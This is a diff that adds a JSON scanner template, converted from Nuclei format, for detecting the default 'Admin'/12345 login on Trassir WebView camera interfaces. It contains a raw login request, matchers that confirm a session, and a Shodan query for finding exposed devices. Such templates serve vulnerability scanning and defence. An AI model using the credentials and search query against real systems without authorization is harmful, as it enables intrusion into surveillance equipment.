@@ -1,0 +1,187 @@
+{
+  "id": "trassir-default-login",
+  "name": "Trassir WebView Default Login - Detect",
+  "author": "gtrrnr,metascan",
+  "severity": "HIGH",
+  "description": "Trassir WebView contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.\n",
+  "references": [
+    "https://confluence.trassir.com/display/TKB/How+to+reset+the+administrator+password+on+the+TRASSIR+NVR"
+  ],
+  "tags": [
+    "default-login",
+    "trassir",
+    "webview"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "title:\"Trassir Webview\""
+  },
+  "variables": {
+    "password": [
+      12345
+    ],
+    "username": [
+      "Admin"
+    ]
+  },
+  "variablesType": "clusterbomb",
+  "cweId": "CWE-522",
+  "cvssScore": "8.3",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /login HTTP/1.1\nHost: {{Hostname}}\n\nusername\u003d{{username}}\u0026password\u003d{{password}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\"success\" :",
+            "\"sid\" :"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": true,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "application/json"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "trassir-default-login",
+    "info": {
+      "name": "Trassir WebView Default Login - Detect",
+      "author": "gtrrnr,metascan",
+      "severity": "high",
+      "description": "Trassir WebView contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.\n",
+      "reference": [
+        "https://confluence.trassir.com/display/TKB/How+to+reset+the+administrator+password+on+the+TRASSIR+NVR"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+        "cvss_score": "8.3",
+        "cwe_id": "CWE-522"
+      },
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "title:\"Trassir Webview\""
+      },
+      "tags": "default-login,trassir,webview"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "username": [
+            "Admin"
+          ],
+          "password": [
+            12345
+          ]
+        },
+        "attack": "clusterbomb",
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /login HTTP/1.1\nHost: {{Hostname}}\n\nusername\u003d{{username}}\u0026password\u003d{{password}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\"success\" :",
+              "\"sid\" :"
+            ],
+            "condition": "and",
+            "case_insensitive": true
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "application/json"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
